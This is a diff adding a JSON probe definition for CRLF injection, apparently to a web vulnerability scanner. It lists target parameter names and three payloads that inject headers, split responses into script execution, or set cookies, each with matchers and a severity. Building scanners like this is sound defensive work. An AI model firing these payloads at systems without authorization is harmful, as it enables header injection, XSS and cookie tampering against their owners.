@@ -1,0 +1,33 @@
+{
+  "category": "crlf_injection",
+  "contexts": {
+    "header_injection": {
+      "description": "CRLF injection to inject HTTP headers",
+      "tech_match": [],
+      "param_match": ["url", "redirect", "return", "next", "goto", "dest", "host", "header", "ref"],
+      "probes": [
+        {
+          "payload": "{{baseline}}%0d%0aX-Injected: true",
+          "description": "CRLF header injection via %0d%0a",
+          "matchers": [{"type": "header", "name": "X-Injected", "contains": "true"}],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}%0d%0a%0d%0a<script>alert(1)</script>",
+          "description": "CRLF to HTTP response splitting (XSS via header injection)",
+          "matchers": [{"type": "reflection", "check_variants": true}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}\\r\\nSet-Cookie: evil=true",
+          "description": "CRLF cookie injection via literal \\r\\n",
+          "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "evil"}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
